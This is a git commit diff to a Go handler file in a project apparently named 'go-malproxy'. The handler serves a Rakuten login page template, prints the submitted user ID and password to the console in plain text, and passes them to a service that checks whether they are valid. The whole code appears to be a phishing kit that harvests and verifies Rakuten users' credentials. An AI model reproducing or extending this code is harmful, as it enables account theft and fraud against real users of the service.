0047a4321d0c5d4fc960fe05a81cc0e59091ed7c
KeiTaylor0606 <mvemtae5757@outlook.jp>
2022-03-21 16:28:33 +0000

    Rakuten

--- server/handler/rakuten_handler.go
+++ server/handler/rakuten_handler.go
@@ -8,22 +8,22 @@ import (
 	"github.com/go-malproxy/server/templates"
 )
 
-func RakutenLoginHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/rakuten-login
+func RakutenLoginHandler(w http.ResponseWriter, r *http.Request) {
 	templates.Executor.ExecuteTemplate(w, "rakuten-login", nil)
 }
 
-func RakutenHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/rakuten-login-info
-	fmt.Println("method:", r.Method)
-	fmt.Println("userid", r.FormValue("userid"))
-	fmt.Println("password", r.FormValue("password"))
+func RakutenHandler(w http.ResponseWriter, r *http.Request) {
+	fmt.Println("method  :", r.Method)
+	fmt.Println("userid  :", r.FormValue("userid"))
+	fmt.Println("password:", r.FormValue("password"))
 	userid := r.FormValue("userid")
 	password := r.FormValue("password")
-	err := services.CheckingTheIntegrityOfRakutenInformation(userid, password)
+	ctxRakuInfo, err := services.CheckingTheIntegrityOfRakutenInformation(ctx, userid, password)
 	if err != nil {
-
 		templates.Executor.ExecuteTemplate(w, "err", nil)
 	}
-	if err := services.CheckingContextContents(); err != nil {
+	ctx = ctxRakuInfo
+	if err := services.CheckingContextContents(ctx); err != nil {
 		log.Fatal(err)
 	}
 
